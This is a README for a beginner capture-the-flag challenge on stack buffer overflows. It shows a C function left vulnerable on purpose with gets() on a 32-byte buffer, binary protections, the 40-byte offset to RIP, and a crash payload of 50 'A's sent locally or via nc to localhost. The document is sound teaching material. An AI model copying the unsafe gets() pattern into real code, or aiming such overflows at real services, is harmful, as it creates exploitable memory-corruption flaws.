# Challenge 01: Oopsie - Buffer Overflow Basics

**Difficulty**: ★☆☆☆☆ Beginner  
**Binary**: `oopsie`  
**Port**: 1337  
**Category**: Memory Corruption / Stack Buffer Overflow

## Description

A simple program that asks for your name using the vulnerable `gets()` function. The buffer is only 32 bytes, but `gets()` has no bounds checking.

## Source Code Analysis

```c
void vulnerable(void)
{
    char buffer[32];        // 32-byte buffer on stack
    printf("Enter your name: ");
    gets(buffer);           // NO BOUNDS CHECKING!
    printf("Hello %s\n", buffer);
}
```

### Vulnerability

- `buffer` is 32 bytes
- `gets()` reads until newline/EOF with no limit
- Excess input overwrites saved RBP (8 bytes) and saved RIP (8 bytes)
- Total offset to RIP: 32 + 8 = 40 bytes

## Binary Protections

```bash
$ checksec --file=oopsie
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

- **No stack canary** (-fno-stack-protector)
- **No PIE** (-no-pie) - addresses are static
- **NX enabled** - stack not executable (default)

## Exploitation

Since there's no `win()` function, the goal is to crash the program. The wrapper script (`run.sh`) detects a segmentation fault (exit code 139) and prints the flag.

### Crash the Program

```bash
# Local
python3 -c "print('A' * 50)" | ./oopsie

# Remote
python3 -c "print('A' * 50)" | nc localhost 1337
```

### Understanding the Stack Layout

```
High Addresses
|------------------------|
| Saved RIP (8 bytes)    |  <-- Overwrite this to control execution
|------------------------|
| Saved RBP (8 bytes)    |  <-- Overwritten with padding
|------------------------|
| buffer[32] (32 bytes)  |  <-- gets() writes here
|------------------------|
Low Addresses
```

Offset to RIP = 32 (buffer) + 8 (RBP) = **40 bytes**

### Verify with GDB

```bash
gdb ./oopsie
(gdb) run
# Enter 50 'A's
(gdb) info registers
# Check RIP = 0x4141414141414141
```

## Flag

The flag is printed automatically when the program crashes (segfault).

## Key Concepts Learned

- Stack memory layout
- Buffer boundaries and overflow
- Segmentation faults from corrupted RIP
- Why `gets()` is dangerous
- Little-endian byte order

## Progressive Hints

1. What happens with 33 characters? 40? 48? 60?
2. Run in GDB, send 60 'A's, check `info registers`
3. What's stored after `buffer` on the stack? How does the function know where to return?